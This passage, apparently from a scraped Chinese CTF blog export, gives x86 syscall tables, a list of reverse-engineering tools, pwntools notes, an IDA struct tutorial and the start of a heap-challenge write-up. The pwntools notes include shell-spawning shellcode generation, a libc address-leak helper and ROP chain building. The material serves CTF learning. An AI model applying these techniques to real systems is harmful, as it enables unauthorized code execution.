366\n#define __NR_getsockname 367\n#define __NR_getpeername 368\n#define __NR_sendto 369\n#define __NR_sendmsg 370\n#define __NR_recvfrom 371\n#define __NR_recvmsg 372\n#define __NR_shutdown 373\n#define __NR_userfaultfd 374\n#define __NR_membarrier 375\n#define __NR_mlock2 376\n#define __NR_copy_file_range 377\n#define __NR_preadv2 378\n#define __NR_pwritev2 379\n\n#endif /* _ASM_X86_UNISTD_32_H */\n</code></pre>\n<h5 id=\"2）64bit\">2）64bit<a class=\"post-anchor\" href=\"#2）64bit\"></a></h5><pre><code class=\"c\">rdi, rsi, rdx, rcx, r8, r9。（stack）\n\n\n#ifndef _ASM_X86_UNISTD_64_H\n#define _ASM_X86_UNISTD_64_H 1\n\n#define __NR_read 0\n#define __NR_write 1\n#define __NR_open 2\n#define __NR_close 3\n#define __NR_stat 4\n#define __NR_fstat 5\n#define __NR_lstat 6\n#define __NR_poll 7\n#define __NR_lseek 8\n#define __NR_mmap 9\n#define __NR_mprotect 10\n#define __NR_munmap 11\n#define __NR_brk 12\n#define __NR_rt_sigaction 13\n#define __NR_rt_sigprocmask 14\n#define __NR_rt_sigreturn 15\n#define __NR_ioctl 16\n#define __NR_pread64 17\n#define __NR_pwrite64 18\n#define __NR_readv 19\n#define __NR_writev 20\n#define __NR_access 21\n#define __NR_pipe 22\n#define __NR_select 23\n#define __NR_sched_yield 24\n#define __NR_mremap 25\n#define __NR_msync 26\n#define __NR_mincore 27\n#define __NR_madvise 28\n#define __NR_shmget 29\n#define __NR_shmat 30\n#define __NR_shmctl 31\n#define __NR_dup 32\n#define __NR_dup2 33\n#define __NR_pause 34\n#define __NR_nanosleep 35\n#define __NR_getitimer 36\n#define __NR_alarm 37\n#define __NR_setitimer 38\n#define __NR_getpid 39\n#define __NR_sendfile 40\n#define __NR_socket 41\n#define __NR_connect 42\n#define __NR_accept 43\n#define __NR_sendto 44\n#define __NR_recvfrom 45\n#define __NR_sendmsg 46\n#define __NR_recvmsg 47\n#define __NR_shutdown 48\n#define __NR_bind 49\n#define __NR_listen 50\n#define __NR_getsockname 51\n#define __NR_getpeername 52\n#define __NR_socketpair 53\n#define __NR_setsockopt 54\n#define __NR_getsockopt 55\n#define __NR_clone 56\n#define __NR_fork 57\n#define __NR_vfork 58\n#define __NR_execve 59\n#define __NR_exit 60\n#define __NR_wait4 61\n#define __NR_kill 62\n#define __NR_uname 63\n#define __NR_semget 64\n#define __NR_semop 65\n#define __NR_semctl 66\n#define __NR_shmdt 67\n#define __NR_msgget 68\n#define __NR_msgsnd 69\n#define __NR_msgrcv 70\n#define __NR_msgctl 71\n#define __NR_fcntl 72\n#define __NR_flock 73\n#define __NR_fsync 74\n#define __NR_fdatasync 75\n#define __NR_truncate 76\n#define __NR_ftruncate 77\n#define __NR_getdents 78\n#define __NR_getcwd 79\n#define __NR_chdir 80\n#define __NR_fchdir 81\n#define __NR_rename 82\n#define __NR_mkdir 83\n#define __NR_rmdir 84\n#define __NR_creat 85\n#define __NR_link 86\n#define __NR_unlink 87\n#define __NR_symlink 88\n#define __NR_readlink 89\n#define __NR_chmod 90\n#define __NR_fchmod 91\n#define __NR_chown 92\n#define __NR_fchown 93\n#define __NR_lchown 94\n#define __NR_umask 95\n#define __NR_gettimeofday 96\n#define __NR_getrlimit 97\n#define __NR_getrusage 98\n#define __NR_sysinfo 99\n#define __NR_times 100\n#define __NR_ptrace 101\n#define __NR_getuid 102\n#define __NR_syslog 103\n#define __NR_getgid 104\n#define __NR_setuid 105\n#define __NR_setgid 106\n#define __NR_geteuid 107\n#define __NR_getegid 108\n#define __NR_setpgid 109\n#define __NR_getppid 110\n#define __NR_getpgrp 111\n#define __NR_setsid 112\n#define __NR_setreuid 113\n#define __NR_setregid 114\n#define __NR_getgroups 115\n#define __NR_setgroups 116\n#define __NR_setresuid 117\n#define __NR_getresuid 118\n#define __NR_setresgid 119\n#define __NR_getresgid 120\n#define __NR_getpgid 121\n#define __NR_setfsuid 122\n#define __NR_setfsgid 123\n#define __NR_getsid 124\n#define __NR_capget 125\n#define __NR_capset 126\n#define __NR_rt_sigpending 127\n#define __NR_rt_sigtimedwait 128\n#define __NR_rt_sigqueueinfo 129\n#define __NR_rt_sigsuspend 130\n#define __NR_sigaltstack 131\n#define __NR_utime 132\n#define __NR_mknod 133\n#define __NR_uselib 134\n#define __NR_personality 135\n#define __NR_ustat 136\n#define __NR_statfs 137\n#define __NR_fstatfs 138\n#define __NR_sysfs 139\n#define __NR_getpriority 140\n#define __NR_setpriority 141\n#define __NR_sched_setparam 142\n#define __NR_sched_getparam 143\n#define __NR_sched_setscheduler 144\n#define __NR_sched_getscheduler 145\n#define __NR_sched_get_priority_max 146\n#define __NR_sched_get_priority_min 147\n#define __NR_sched_rr_get_interval 148\n#define __NR_mlock 149\n#define __NR_munlock 150\n#define __NR_mlockall 151\n#define __NR_munlockall 152\n#define __NR_vhangup 153\n#define __NR_modify_ldt 154\n#define __NR_pivot_root 155\n#define __NR__sysctl 156\n#define __NR_prctl 157\n#define __NR_arch_prctl 158\n#define __NR_adjtimex 159\n#define __NR_setrlimit 160\n#define __NR_chroot 161\n#define __NR_sync 162\n#define __NR_acct 163\n#define __NR_settimeofday 164\n#define __NR_mount 165\n#define __NR_umount2 166\n#define __NR_swapon 167\n#define __NR_swapoff 168\n#define __NR_reboot 169\n#define __NR_sethostname 170\n#define __NR_setdomainname 171\n#define __NR_iopl 172\n#define __NR_ioperm 173\n#define __NR_create_module 174\n#define __NR_init_module 175\n#define __NR_delete_module 176\n#define __NR_get_kernel_syms 177\n#define __NR_query_module 178\n#define __NR_quotactl 179\n#define __NR_nfsservctl 180\n#define __NR_getpmsg 181\n#define __NR_putpmsg 182\n#define __NR_afs_syscall 183\n#define __NR_tuxcall 184\n#define __NR_security 185\n#define __NR_gettid 186\n#define __NR_readahead 187\n#define __NR_setxattr 188\n#define __NR_lsetxattr 189\n#define __NR_fsetxattr 190\n#define __NR_getxattr 191\n#define __NR_lgetxattr 192\n#define __NR_fgetxattr 193\n#define __NR_listxattr 194\n#define __NR_llistxattr 195\n#define __NR_flistxattr 196\n#define __NR_removexattr 197\n#define __NR_lremovexattr 198\n#define __NR_fremovexattr 199\n#define __NR_tkill 200\n#define __NR_time 201\n#define __NR_futex 202\n#define __NR_sched_setaffinity 203\n#define __NR_sched_getaffinity 204\n#define __NR_set_thread_area 205\n#define __NR_io_setup 206\n#define __NR_io_destroy 207\n#define __NR_io_getevents 208\n#define __NR_io_submit 209\n#define __NR_io_cancel 210\n#define __NR_get_thread_area 211\n#define __NR_lookup_dcookie 212\n#define __NR_epoll_create 213\n#define __NR_epoll_ctl_old 214\n#define __NR_epoll_wait_old 215\n#define __NR_remap_file_pages 216\n#define __NR_getdents64 217\n#define __NR_set_tid_address 218\n#define __NR_restart_syscall 219\n#define __NR_semtimedop 220\n#define __NR_fadvise64 221\n#define __NR_timer_create 222\n#define __NR_timer_settime 223\n#define __NR_timer_gettime 224\n#define __NR_timer_getoverrun 225\n#define __NR_timer_delete 226\n#define __NR_clock_settime 227\n#define __NR_clock_gettime 228\n#define __NR_clock_getres 229\n#define __NR_clock_nanosleep 230\n#define __NR_exit_group 231\n#define __NR_epoll_wait 232\n#define __NR_epoll_ctl 233\n#define __NR_tgkill 234\n#define __NR_utimes 235\n#define __NR_vserver 236\n#define __NR_mbind 237\n#define __NR_set_mempolicy 238\n#define __NR_get_mempolicy 239\n#define __NR_mq_open 240\n#define __NR_mq_unlink 241\n#define __NR_mq_timedsend 242\n#define __NR_mq_timedreceive 243\n#define __NR_mq_notify 244\n#define __NR_mq_getsetattr 245\n#define __NR_kexec_load 246\n#define __NR_waitid 247\n#define __NR_add_key 248\n#define __NR_request_key 249\n#define __NR_keyctl 250\n#define __NR_ioprio_set 251\n#define __NR_ioprio_get 252\n#define __NR_inotify_init 253\n#define __NR_inotify_add_watch 254\n#define __NR_inotify_rm_watch 255\n#define __NR_migrate_pages 256\n#define __NR_openat 257\n#define __NR_mkdirat 258\n#define __NR_mknodat 259\n#define __NR_fchownat 260\n#define __NR_futimesat 261\n#define __NR_newfstatat 262\n#define __NR_unlinkat 263\n#define __NR_renameat 264\n#define __NR_linkat 265\n#define __NR_symlinkat 266\n#define __NR_readlinkat 267\n#define __NR_fchmodat 268\n#define __NR_faccessat 269\n#define __NR_pselect6 270\n#define __NR_ppoll 271\n#define __NR_unshare 272\n#define __NR_set_robust_list 273\n#define __NR_get_robust_list 274\n#define __NR_splice 275\n#define __NR_tee 276\n#define __NR_sync_file_range 277\n#define __NR_vmsplice 278\n#define __NR_move_pages 279\n#define __NR_utimensat 280\n#define __NR_epoll_pwait 281\n#define __NR_signalfd 282\n#define __NR_timerfd_create 283\n#define __NR_eventfd 284\n#define __NR_fallocate 285\n#define __NR_timerfd_settime 286\n#define __NR_timerfd_gettime 287\n#define __NR_accept4 288\n#define __NR_signalfd4 289\n#define __NR_eventfd2 290\n#define __NR_epoll_create1 291\n#define __NR_dup3 292\n#define __NR_pipe2 293\n#define __NR_inotify_init1 294\n#define __NR_preadv 295\n#define __NR_pwritev 296\n#define __NR_rt_tgsigqueueinfo 297\n#define __NR_perf_event_open 298\n#define __NR_recvmmsg 299\n#define __NR_fanotify_init 300\n#define __NR_fanotify_mark 301\n#define __NR_prlimit64 302\n#define __NR_name_to_handle_at 303\n#define __NR_open_by_handle_at 304\n#define __NR_clock_adjtime 305\n#define __NR_syncfs 306\n#define __NR_sendmmsg 307\n#define __NR_setns 308\n#define __NR_getcpu 309\n#define __NR_process_vm_readv 310\n#define __NR_process_vm_writev 311\n#define __NR_kcmp 312\n#define __NR_finit_module 313\n#define __NR_sched_setattr 314\n#define __NR_sched_getattr 315\n#define __NR_renameat2 316\n#define __NR_seccomp 317\n#define __NR_getrandom 318\n#define __NR_memfd_create 319\n#define __NR_kexec_file_load 320\n#define __NR_bpf 321\n#define __NR_execveat 322\n#define __NR_userfaultfd 323\n#define __NR_membarrier 324\n#define __NR_mlock2 325\n#define __NR_copy_file_range 326\n#define __NR_preadv2 327\n#define __NR_pwritev2 328\n\n#endif /* _ASM_X86_UNISTD_64_H */\n</code></pre>\n<h3 id=\"5）tools\">5）tools<a class=\"post-anchor\" href=\"#5）tools\"></a></h3><h6 id=\"1）seccomp-tools\">1）seccomp-tools<a class=\"post-anchor\" href=\"#1）seccomp-tools\"></a></h6><p><a href=\"https://github.com/david942j/seccomp-tools%E3%80%90%E6%9F%A5%E7%9C%8Bseccomp%E7%A6%81%E7%94%A8%E4%BA%86%E4%BB%80%E4%B9%88%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E3%80%91\">https://github.com/david942j/seccomp-tools【查看seccomp禁用了什么系统调用】</a></p>\n<h6 id=\"2）scyllahide\">2）scyllahide<a class=\"post-anchor\" href=\"#2）scyllahide\"></a></h6><p><a href=\"https://github.com/x64dbg/ScyllaHide\">https://github.com/x64dbg/ScyllaHide</a></p>\n<h6 id=\"3）ollydump\">3）ollydump<a class=\"post-anchor\" href=\"#3）ollydump\"></a></h6><p><a href=\"https://www.52pojie.cn/thread-785387-1-1.html\">https://www.52pojie.cn/thread-785387-1-1.html</a></p>\n<p>elf</p>\n<h6 id=\"4）文件dump内存信息。\">4）文件dump内存信息。<a class=\"post-anchor\" href=\"#4）文件dump内存信息。\"></a></h6><p><a href=\"https://blog.csdn.net/qq_36119192/article/details/96474833\">https://blog.csdn.net/qq_36119192/article/details/96474833</a></p>\n<p>![image-20210530174645013](/Users/rin/Library/Application Support/typora-user-images/image-20210530174645013.png)</p>\n<p>unicorn engine</p>\n<h6 id=\"5）capstone\">5）capstone<a class=\"post-anchor\" href=\"#5）capstone\"></a></h6><p><a href=\"https://github.com/aquynh/capstone\">https://github.com/aquynh/capstone</a></p>\n<h6 id=\"6）qemu-stastic-x64\">6）qemu_stastic_x64<a class=\"post-anchor\" href=\"#6）qemu-stastic-x64\"></a></h6><p><a href=\"https://github.com/multiarch/qemu-user-static\">https://github.com/multiarch/qemu-user-static</a></p>\n<h6 id=\"7）angr\">7）angr<a class=\"post-anchor\" href=\"#7）angr\"></a></h6><p><a href=\"https://github.com/angr\">https://github.com/angr</a></p>\n<h3 id=\"6）pwntools组件\">6）pwntools组件<a class=\"post-anchor\" href=\"#6）pwntools组件\"></a></h3><h5 id=\"1）pwntools指定glibc版本\">1）pwntools指定glibc版本<a class=\"post-anchor\" href=\"#1）pwntools指定glibc版本\"></a></h5><h6 id=\"获取不同版本glibc\">获取不同版本glibc<a class=\"post-anchor\" href=\"#获取不同版本glibc\"></a></h6><p><a href=\"https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/\">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/</a></p>\n<p>pwntools加载。</p>\n<pre><code class=\"python\">from pwn import *\ncontext.log_level=\"debug\"\nsh = process([\"./lib00/lib/x86_64-linux-gnu/ld-2.31.so\", \"./hello\"],env={\"LD_PRELOAD\":\"./lib00/lib/x86_64-linux-gnu/libc.so.6\"})\n\npwnlib.gdb.attach(sh)\nsh.interactive()\n</code></pre>\n<h5 id=\"2）基本模块\">2）基本模块<a class=\"post-anchor\" href=\"#2）基本模块\"></a></h5><h6 id=\"1）asm-shellcraft\">1）asm/shellcraft<a class=\"post-anchor\" href=\"#1）asm-shellcraft\"></a></h6><p> 汇编与反汇编，支持x86/x64/arm/mips/power pc等基本上所有的主流平台</p>\n<pre><code class=\"shell\">asm(shellcraft.sh())\nshellcraft.amd64.sh()\n</code></pre>\n<h6 id=\"2）dynelf\">2）dynelf<a class=\"post-anchor\" href=\"#2）dynelf\"></a></h6><pre><code class=\"python\">#example:\n\ndef leak():\n  payload = p64(addr)\n  p.send(payload)\n  data = p.recv()\n  log.info(\"leaking: 0x%x --&gt; %s\" % (addr, (data or '').encode('hex')))\n   return data\n\nd = DynELF(leak,elf = elf)\nsystem  = d.lookup('system','libc')\n</code></pre>\n<h6 id=\"3）gdb\">3）gdb<a class=\"post-anchor\" href=\"#3）gdb\"></a></h6><p> : 配合gdb进行调试，设置断点之后便能够在运行过程中直接调用GDB断下，类似于设置为即使调试JIT</p>\n<h6 id=\"5）memleak\">5）memleak<a class=\"post-anchor\" href=\"#5）memleak\"></a></h6><p>: 用于内存泄漏</p>\n<h6 id=\"5）rop\">5）rop<a class=\"post-anchor\" href=\"#5）rop\"></a></h6><p>【<a href=\"https://www.jianshu.com/p/0d45e2025d97?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation%E3%80%91\">https://www.jianshu.com/p/0d45e2025d97?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation】</a></p>\n<pre><code class=\"bash\">In [59]: rop.\nrop.base                   rop.elfs                   rop.leave                  rop.resolve\nrop.build                  rop.find_gadget            rop.migrate                rop.search\nrop.call                   rop.find_stack_adjustment  rop.migrated               rop.search_iter\nrop.chain                  rop.from_blob              rop.pivots                 rop.setRegisters\nrop.describe               rop.gadgets                rop.raw                    rop.unresolve\nrop.dump                   rop.generatePadding        rop.regs                   \n</code></pre>\n<p><code>rop = ROP（'main')</code></p>\n<p><code>ROP([ELF('./main')])</code>创建rop对象</p>\n<p><code>rop.raw</code>:添加数据</p>\n<pre><code class=\"bash\">rop.raw(b\"a\"*10)\n</code></pre>\n<p><code>rop.dump</code>会将已经构建的栈数据输出,而且方便阅读</p>\n<p><code>rop.call</code></p>\n<pre><code class=\"bash\">rop.call('read',[1,2,3])\nprint rop.dump()\n0x0000:           'aaaa' 'aaaaaaaaaa'\n0x0004:           'aaaa'\n0x0008:           'aaaa'\n0x000c:        0x80483a0 read(1, 2, 3)\n0x0010:           'eaaa' &lt;return address&gt;\n0x0014:              0x1 arg0\n0x0018:              0x2 arg1\n0x001c:              0x3 arg2\n</code></pre>\n<p>第一个参数为目标函数符号名,第二个参数是个list,作为目标函数的参数.然后构建出数据拼接到已有的数据中<br>或者使用rop.read(1,2,3):效果和call一样.细心点可以发现前一个read后的返回地址改成了栈调整的数据.rop模块会自动寻找gadget来连接上2次功能调用</p>\n<p><code>rop.migrate</code>括号直接接地址。</p>\n<p>具体操作</p>\n<pre><code class=\"bash\">#rop.migrate(2)\n#print rop.dump()\n0x0034:        0x804861b pop ebp; ret\n0x0038:             -0x2\n0x003c:        0x8048458 leave; ret\n</code></pre>\n<p>相当于自动化地实现了栈迁移。（pwntools yyds）</p>\n<p><code>rop.chain</code>返回当前所有rop chain的shellcode值。</p>\n</body></html>","tags":["mess"]},{"title":"ida的结构体识别","url":"/2022/03/17/ida%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E8%AF%86%E5%88%AB/","content":"<html><head></head><body><h4 id=\"0\">0<a class=\"post-anchor\" href=\"#0\"></a></h4><p>​        最近发现做堆题最慢的不是调试，而是在逆向的过程中寻找思路，而一般堆题的菜单都是由结构体管理，所以如果能在ida中快速方便地查看结构体相关的指针操作就再好不过了。然而一般来说ida是无法直接识别结构体这种比较高级的数据结构的，所以需要我们手动去创建并修改。</p>\n<h4 id=\"1\">1<a class=\"post-anchor\" href=\"#1\"></a></h4><p>​        首先可以在ida<code>structures</code>的界面手动添加一些结构体<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%888.35.57.png\" data-caption=\"截屏2022-03-17 下午8.35.57\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-17%20%E4%B8%8B%E5%8D%888.35.57.png\" alt=\"截屏2022-03-17 下午8.35.57\"></a></p>\n<p>​        右键空白处，选择<code>add struct type</code>，便可以新建结构体。鼠标选中ends字段，按下D可以新建字段，在当前字段再按下D可以调整字段长度。</p>\n<p>​        </p>\n<h5 id=\"为反汇编代码添加结构体\">为反汇编代码添加结构体<a class=\"post-anchor\" href=\"#为反汇编代码添加结构体\"></a></h5><p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8A%E5%8D%8811.28.06.png\" data-caption=\"截屏2022-03-18 上午11.28.06\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8A%E5%8D%8811.28.06.png\" alt=\"截屏2022-03-18 上午11.28.06\"></a></p>\n<p>​        </p>\n<p>​        随便一道堆题，逻辑比较简单，几个对于字段的处理都比较直观，所以可以较为清楚地知道head结构体中的字段，然后右键head创建结构体，        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8A%E5%8D%8811.32.26.png\" data-caption=\"截屏2022-03-18 上午11.32.26\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8A%E5%8D%8811.32.26.png\" alt=\"截屏2022-03-18 上午11.32.26\"></a></p>\n<p>然后按照实际情况调整。</p>\n</body></html>","tags":["mess"]},{"title":"search engine","url":"/2022/03/18/week-4.1/","content":"<p>​    overview</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%889.00.02.png\" alt=\"截屏2022-03-18 下午9.00.02\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%889.02.53.png\" alt=\"截屏2022-03-18 下午9.02.53\"></p>\n<h3 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h3><p>​        菜单中的功能比较少，但是比较奇怪。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%889.37.06.png\" alt=\"截屏2022-03-18 下午9.37.06\"></p>\n<h4 id=\"searche-word\"><a href=\"#searche-word\" class=\"headerlink\" title=\"searche word\"></a>searche word</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-18%20%E4%B8%8B%E5%8D%889.45.44.png\" alt=\"截屏2022-03-18 下午9.45.44\"></p>\n<p>​        这个函数大致实现了一个“查找”word，如果找到则输出，并选择是否将其删除。</p>\n<p>​        </p>\n<p>​    </p>\n","tags":["heap"]}]